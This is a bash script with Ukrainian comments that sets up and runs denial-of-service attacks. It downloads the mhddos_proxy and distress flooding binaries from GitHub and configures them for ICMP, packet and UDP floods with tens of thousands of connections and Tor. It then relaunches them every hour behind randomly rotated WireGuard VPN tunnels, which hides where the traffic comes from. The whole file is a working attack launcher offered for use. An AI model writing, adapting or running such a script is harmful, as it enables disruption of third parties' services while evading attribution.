#!/bin/bash

set -e

#=== Підготовка середовища для будь-якої Linux-системи ===

echo "[+] Перевірка користувача..."
if [ "$(id -u)" -eq 0 ]; then
    SUDO=""
    echo "[+] Ви root. sudo не потрібен."
else
    if command -v sudo >/dev/null 2>&1; then
        SUDO="sudo"
        echo "[+] sudo доступний."
    else
        echo "[-] sudo не знайдено. Потрібно встановити або увійти як root."
        exit 1
    fi
fi

echo "[+] Визначення пакетного менеджера..."
if command -v apt-get >/dev/null 2>&1; then
    PKG_MANAGER="apt-get"
    UPDATE_CMD="$SUDO apt-get update -y"
    INSTALL_CMD="$SUDO apt-get install -y"
elif command -v dnf >/dev/null 2>&1; then
    PKG_MANAGER="dnf"
    UPDATE_CMD="$SUDO dnf check-update || true"
    INSTALL_CMD="$SUDO dnf install -y"
elif command -v yum >/dev/null 2>&1; then
    PKG_MANAGER="yum"
    UPDATE_CMD="$SUDO yum check-update || true"
    INSTALL_CMD="$SUDO yum install -y"
elif command -v apk >/dev/null 2>&1; then
    PKG_MANAGER="apk"
    UPDATE_CMD="$SUDO apk update"
    INSTALL_CMD="$SUDO apk add"
else
    echo "[-] Не знайдено підтримуваного пакетного менеджера."
    exit 1
fi

echo "[+] Менеджер пакетів: $PKG_MANAGER"

echo "[+] Оновлення системи і встановлення необхідних пакетів..."
$UPDATE_CMD
$INSTALL_CMD curl wget git screen sed

#=== Підготовка папок ===
MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"
LOG_DIR="$HOME/logs"
mkdir -p "$MODULE_DIR" "$WG_DIR" "$LOG_DIR"

SCRIPT_PATH="$(realpath "$0")"
WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"

#=== Завантаження WG-конфігів ===
echo "[+] Завантаження WG-конфігів..."
CONF_LIST=$(curl -s "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\.conf(?=")' | grep '/k7771/Kaljan747/blob/' | sed 's|^/|https://github.com/|g' | sed 's|blob/|raw/|' | sed "s|https://github.com/k7771/Kaljan747/raw/k7771/wg/|$WG_RAW_BASE/|g" | grep -E '\.conf$')

for url in $CONF_LIST; do
    file=$(basename "$url")
    wget -qO "$WG_DIR/$file" "$url" && echo "[+] Завантажено: $file"
done

$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true

#=== Створення .ini файлів ===
INI1="$MODULE_DIR/mhddos.ini"
INI2="$MODULE_DIR/distress.ini"

if [ ! -f "$INI1" ]; then
  echo "--use-my-ip 0 --copies auto -t 8000" > "$INI1"
fi

if [ ! -f "$INI2" ]; then
  echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000" > "$INI2"
fi

#=== Завантаження модулів ===
echo "[+] Завантаження модулів..."
[ -f "$MODULE_DIR/mhddos_proxy" ] || wget -qO "$MODULE_DIR/mhddos_proxy" https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
[ -f "$MODULE_DIR/distress" ] || wget -qO "$MODULE_DIR/distress" https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl

chmod +x "$MODULE_DIR/mhddos_proxy" "$MODULE_DIR/distress"

#=== Вибір модуля ===
CONFIG_CHOICE_FILE="$HOME/last_module_choice.txt"

if [[ ! -s "$CONFIG_CHOICE_FILE" ]]; then
    echo "[?] Виберіть модуль:"
    echo "1 - mhddos_proxy"
    echo "2 - distress"
    read -p "[1/2]: " module_choice
    echo "$module_choice" > "$CONFIG_CHOICE_FILE"
else
    module_choice=$(cat "$CONFIG_CHOICE_FILE")
fi

case $module_choice in
    1)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$INI1"
        MODULE_NAME="mhddos"
        ;;
    2)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$INI2"
        MODULE_NAME="distress"
        ;;
    *)
        echo "[-] Невірний вибір модуля."
        exit 1
        ;;
esac

ARGS=$(cat "$CONFIG_FILE")

#=== Вибір способу запуску ===
RUN_MODE_FILE="$HOME/last_run_mode.txt"
if [[ ! -s "$RUN_MODE_FILE" ]]; then
    echo "[?] Виберіть спосіб запуску:"
    echo "1 - screen у фоні"
    echo "2 - без screen у терміналі"
    read -p "[1/2]: " run_mode
    echo "$run_mode" > "$RUN_MODE_FILE"
else
    run_mode=$(cat "$RUN_MODE_FILE")
fi

#=== Основний цикл запуску ===
while true; do
    echo "[+] Очікування до наступної години..."
    SLEEP_SEC=$((3600 - $(date +%M)*60 - $(date +%S)))
    sleep $SLEEP_SEC

    echo "[+] Перезапуск: зупинка модуля..."
    pkill -f "$MODULE" 2>/dev/null || screen -S "$MODULE_NAME" -X quit 2>/dev/null || true
    sleep 2

    echo "[+] Вимкнення всіх WG інтерфейсів..."
    ACTIVE_WG=$(wg show interfaces 2>/dev/null || true)
    for iface in $ACTIVE_WG; do
        $SUDO wg-quick down "$iface" || true
    done
    sleep 2

    echo "[+] Підключення нових WG конфігів..."
    WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
    for conf in "${WG_FILES[@]}"; do
        $SUDO wg-quick up "$conf" && echo "[+] Підключено: $conf"
        sleep 1
    done

    echo "[+] Запуск модуля..."
    if [[ $run_mode == "1" ]]; then
        screen -dmS "$MODULE_NAME" $MODULE $ARGS
    elif [[ $run_mode == "2" ]]; then
        $MODULE $ARGS
    fi

    echo "[+] Перезапуск за годину підготовлений."
    echo "$(date '+%Y-%m-%d %H:%M:%S') [+] Перезапуск виконано." >> "$LOG_DIR/kaljan.log"

done
